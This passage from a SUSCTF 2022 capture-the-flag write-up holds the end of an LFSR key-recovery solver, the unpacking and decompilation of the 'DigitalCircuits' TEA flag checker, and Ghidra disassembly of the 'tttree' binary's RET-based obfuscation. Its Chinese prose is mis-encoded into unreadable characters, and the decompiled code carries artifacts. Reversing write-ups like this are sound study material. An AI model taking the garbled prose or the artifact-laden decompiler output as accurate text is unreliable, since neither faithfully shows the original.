</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bit_list</span><span class=p>)</span> <span class=o>-</span> <span class=n>n1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>rol</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>rol</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>bit_list</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>mat</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>mat</span> <span class=o>=</span> <span class=n>gauss</span><span class=p>(</span><span class=n>mat</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>mask1</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>mask1</span> <span class=o>=</span> <span class=n>mask1</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>mat</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>seed_list</span> <span class=o>=</span> <span class=n>bit_list</span><span class=p>[:</span><span class=n>n1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>mask_list</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>mask1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=n>n1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>mask_list</span><span class=p>[</span><span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>^=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>[</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>seed_list</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>+</span> <span class=n>seed_list</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>seed1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>seed_list</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>magic</span> <span class=o>=</span> <span class=mi>15193544052573546419</span>
</span></span><span class=line><span class=cl>    <span class=n>lfsr1</span><span class=o>=</span><span class=n>lfsr</span><span class=p>(</span><span class=n>seed1</span><span class=p>,</span> <span class=n>mask1</span><span class=p>,</span> <span class=n>n1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>lfsr2</span><span class=o>=</span><span class=n>lfsr</span><span class=p>(</span><span class=n>seed3</span><span class=p>,</span> <span class=n>mask2</span><span class=p>,</span> <span class=n>n2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>generator</span><span class=p>(</span><span class=n>lfsr1</span><span class=p>,</span> <span class=n>lfsr2</span><span class=p>,</span> <span class=n>magic</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>cip_1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=n>cipher</span><span class=o>.</span><span class=n>getrandbit</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp</span> <span class=o>&gt;</span> <span class=mi>127</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>plain</span> <span class=o>=</span> <span class=p>(</span><span class=n>plain</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;SUSCTF&#39;</span> <span class=ow>in</span> <span class=n>plain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=rev>Rev</h1><h2 id=digitalcircuits>DigitalCircuits</h2><p>é¢˜ç›®ç›®æµ‹ç”¨Python ç”Ÿæˆçš„exeï¼Œé¦–å…ˆç”¨pyinstxtractor.py è§£åŒ…exe
python pyinstxtractor.py DigitalCircuits.exe
ä¹‹åå¯¹æ¯” struct ä¸ DigitalCircuits 2ä¸ªæ–‡ä»¶çš„16è¿›åˆ¶ç 
<img src=/img/2022-2-28-SUSCTF/20220301005626629.jpg alt=img>
<img src=/img/2022-2-28-SUSCTF/20220301005626083.jpg alt=img>
å¤åˆ¶æ’å…¥16è¿›åˆ¶ç  ä¿®å¤Pythonç‰ˆæœ¬å’Œæ—¶é—´æˆ³ä¹‹å å°†DigitalCircuitsåç¼€æ”¹ä¸º.pyc
ç”¨pythonåœ¨çº¿åç¼–è¯‘å‡ºpyä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># visit https://tool.lu/pyc/ for more information</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f1</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=ow>and</span> <span class=n>b</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f2</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span> <span class=ow>and</span> <span class=n>b</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f3</span><span class=p>(</span><span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=kc>None</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f4</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>f2</span><span class=p>(</span><span class=n>f1</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>f3</span><span class=p>(</span><span class=n>b</span><span class=p>)),</span> <span class=n>f1</span><span class=p>(</span><span class=n>f3</span><span class=p>(</span><span class=n>a</span><span class=p>),</span> <span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f5</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>,</span> <span class=n>z</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>f4</span><span class=p>(</span><span class=n>f4</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=n>z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>f2</span><span class=p>(</span><span class=n>f1</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=n>f1</span><span class=p>(</span><span class=n>z</span><span class=p>,</span> <span class=n>f2</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f6</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>z</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>a</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span> <span class=o>+=</span> <span class=n>f5</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>z</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>z</span> <span class=o>=</span> <span class=n>f5</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>z</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ans</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f7</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span><span class=p>[</span><span class=n>n</span><span class=p>:]</span> <span class=o>+</span> <span class=s1>&#39;0&#39;</span> <span class=o>*</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f8</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span> <span class=o>*</span> <span class=s1>&#39;0&#39;</span> <span class=o>+</span> <span class=n>a</span><span class=p>[:</span><span class=o>-</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f9</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span> <span class=o>+=</span> <span class=n>f4</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ans</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f10</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=n>v1</span><span class=p>,</span> <span class=n>k0</span><span class=p>,</span> <span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>,</span> <span class=n>k3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=s1>&#39;00000000000000000000000000000000&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=s1>&#39;10011110001101110111100110111001&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>f6</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>v0</span> <span class=o>=</span> <span class=n>f6</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=n>f9</span><span class=p>(</span><span class=n>f9</span><span class=p>(</span><span class=n>f6</span><span class=p>(</span><span class=n>f7</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span> <span class=n>k0</span><span class=p>),</span> <span class=n>f6</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>s</span><span class=p>)),</span> <span class=n>f6</span><span class=p>(</span><span class=n>f8</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=mi>5</span><span class=p>),</span> <span class=n>k1</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>=</span> <span class=n>f6</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>f9</span><span class=p>(</span><span class=n>f9</span><span class=p>(</span><span class=n>f6</span><span class=p>(</span><span class=n>f7</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span> <span class=n>k2</span><span class=p>),</span> <span class=n>f6</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=n>s</span><span class=p>)),</span> <span class=n>f6</span><span class=p>(</span><span class=n>f8</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=mi>5</span><span class=p>),</span> <span class=n>k3</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v0</span> <span class=o>+</span> <span class=n>v1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>k0</span> <span class=o>=</span> <span class=s1>&#39;0100010001000101&#39;</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>k1</span> <span class=o>=</span> <span class=s1>&#39;0100000101000100&#39;</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>k2</span> <span class=o>=</span> <span class=s1>&#39;0100001001000101&#39;</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>k3</span> <span class=o>=</span> <span class=s1>&#39;0100010101000110&#39;</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;please input flag:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>7</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;SUSCTF{&#39;</span> <span class=ow>or</span> <span class=n>flag</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;}&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Error!!!The formate of flag is SUSCTF</span><span class=si>{XXX}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flagstr</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>7</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>flagstr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>24</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Error!!!The length of flag 24&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>flagstr</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=n>flagstr</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>4</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>5</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>6</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>flagstr</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>7</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>+=</span> <span class=n>f10</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=n>v1</span><span class=p>,</span> <span class=n>k0</span><span class=p>,</span> <span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>,</span> <span class=n>k3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>res</span> <span class=o>==</span> <span class=s1>&#39;001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;True&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;False&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å…¶å®æœ¬è´¨æ˜¯ä¸€ä¸ªTEAï¼ˆåŒ…æ‹¬é­”æ•°éƒ½ä¸€æ ·äº†ï¼‰ï¼Œç›´æ¥å†™å‡ºTEAè§£å¯†ç®—æ³•å³å¯</p><h2 id=tttree>tttree</h2><p>åœ¨ghidraä¸­æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹åˆ°å…¥å£å‡½æ•°éå¸¸å°ï¼Œæ²¡æœ‰è°ƒç”¨è‡ªèº«ä»¥å¤–çš„ä¸œè¥¿</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>longlong __fastcall entry(void)
</span></span><span class=line><span class=cl>             longlong          RAX:8               &lt;RETURN&gt;
</span></span><span class=line><span class=cl>             undefined8        Stack[-0x30]:8      local_30                                XREF[1]:     1400133ce(W)  
</span></span><span class=line><span class=cl>                             entry                                           XREF[2]:     Entry Point(*), 140000120(*)  
</span></span><span class=line><span class=cl>         1400133b7 52              PUSH         RDX
</span></span><span class=line><span class=cl>         1400133b8 5a              POP          RDX
</span></span><span class=line><span class=cl>         1400133b9 51              PUSH         RCX
</span></span><span class=line><span class=cl>         1400133ba 59              POP          RCX
</span></span><span class=line><span class=cl>         1400133bb 48 83 ec 28     SUB          RSP,0x28
</span></span><span class=line><span class=cl>         1400133bf 50              PUSH         RAX
</span></span><span class=line><span class=cl>         1400133c0 50              PUSH         RAX
</span></span><span class=line><span class=cl>         1400133c1 9c              PUSHFQ
</span></span><span class=line><span class=cl>         1400133c2 e8 00 00        CALL         LAB_1400133c7
</span></span><span class=line><span class=cl>                   00 00
</span></span><span class=line><span class=cl>                             LAB_1400133c7                                   XREF[1]:     1400133c2(j)  
</span></span><span class=line><span class=cl>         1400133c7 58              POP          RAX
</span></span><span class=line><span class=cl>         1400133c8 48 05 1b        ADD          RAX,0x191b
</span></span><span class=line><span class=cl>                   19 00 00
</span></span><span class=line><span class=cl>         1400133ce 48 89 44        MOV          qword ptr [RSP + 0x10]=&gt;local_30,RAX=&gt;FUN_1400
</span></span><span class=line><span class=cl>                   24 10
</span></span><span class=line><span class=cl>         1400133d3 9d              POPFD
</span></span><span class=line><span class=cl>         1400133d4 58              POP          RAX
</span></span><span class=line><span class=cl>         1400133d5 c3              RET
</span></span></code></pre></td></tr></table></div></div><p>ç”¨RETä»£æ›¿è·³è½¬å’Œè°ƒç”¨ã€‚æ‰€ä»¥å®ƒæ˜¯é¢å‘è¿”å›çš„ç¼–ç¨‹ï¼Œä½†åˆæœ‰æ‰€ä¸åŒ :D
RETå°†è·³è½¬çš„åœ°å€ç”¨mov <code>[rsp+0x10]</code>, raxå†™å…¥ï¼Œè€Œraxåˆ™ç”¨pop raxè®¾ç½®ï¼›add rax $x
